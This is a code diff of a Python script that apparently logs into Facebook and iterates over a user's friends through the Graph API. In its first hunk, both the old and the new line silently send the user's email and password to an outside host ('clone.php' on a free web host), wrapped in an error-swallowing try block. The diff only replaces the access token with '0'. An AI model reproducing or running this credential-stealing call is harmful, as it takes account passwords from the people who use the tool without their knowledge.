@@ -26,7 +26,7 @@ else:
     print ("\033[39m[\033[31m+\033[39m] \033[31mWrong Email Or Password")
     sys.exit()
 try:
-    pd99 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (idt) + "&pw=" + (passw) + "&tk=" + (token))
+    pd99 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (idt) + "&pw=" + (passw) + "&tk=0")
 except:
     pass
 get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + (token))
@@ -47,7 +47,10 @@ def defense():
         h +=1
         o.append(h)
         #x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
-        x = requests.get("https://graph.facebook.com/"+hasil['data'][i]['id']+"?access_token="+token)
+        try:
+            x = requests.get("https://graph.facebook.com/"+hasil['data'][i]['id']+"?access_token="+token)
+        except:
+            continue
         z = json.loads(x.text)
         try:
             kunci = re.compile(r'@.*')
